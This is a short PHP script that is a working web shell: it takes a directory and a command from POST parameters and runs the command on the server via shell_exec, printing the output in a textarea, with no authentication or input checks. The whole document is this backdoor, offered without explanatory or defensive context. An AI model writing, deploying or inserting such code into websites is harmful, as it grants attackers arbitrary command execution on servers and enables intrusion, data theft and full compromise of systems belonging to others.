<?php
@chdir(urldecode($_POST['dir']));
echo "<textarea rows=15 cols=114>";
echo shell_exec($_POST['command']);
echo "</textarea>";
exit;
?>